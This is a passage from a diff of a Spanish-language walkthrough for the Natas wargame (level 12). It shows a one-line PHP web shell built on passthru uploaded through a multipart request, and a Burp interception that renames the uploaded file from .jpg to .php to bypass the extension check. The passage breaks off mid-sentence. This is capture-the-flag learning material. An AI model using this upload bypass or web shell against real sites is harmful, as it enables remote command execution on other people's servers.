@@ -176,7 +176,7 @@ Content-Disposition: form-data; name="MAX_FILE_SIZE"
 -----------------------------17458871318756377591816066944
 Content-Disposition: form-data; name="filename"
 
-phpShell.php.jpg
+ujofljdn2f.jpg
 -----------------------------17458871318756377591816066944
 Content-Disposition: form-data; name="uploadedfile"; filename="phpShell.php"
 Content-Type: application/x-php
@@ -187,12 +187,32 @@ passthru($GET_['cmd']);
 -----------------------------17458871318756377591816066944--
 ```
 
+Interceptamos el tráfico y modificamos el valor de **filename**:
+- ujofljdn2f.jpg -> phpShell.php
 
+quedando:
+
+```html
+-----------------------------17458871318756377591816066944
+Content-Disposition: form-data; name="filename"
+
+phpShell.php
+```
+
+Le damos a **Forward** en **BURP** y nos indica que hemos **subido correctamente** el fichero a la siguiente dirección
+
+```html
 The file upload/ujofljdn2f.php has been uploaded
+```
 
+Entramos en la **URL** que nos han proporcionado y nos muestra este mensaje:
+
+```php
 Notice: Undefined variable: GET_ in /var/www/natas/natas12/upload/ujofljdn2f.php on line 2
-
 Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/upload/ujofljdn2f.php on line 2
+```
+
+Nos dice que no puede ejecutar un comando en 
 
 
 
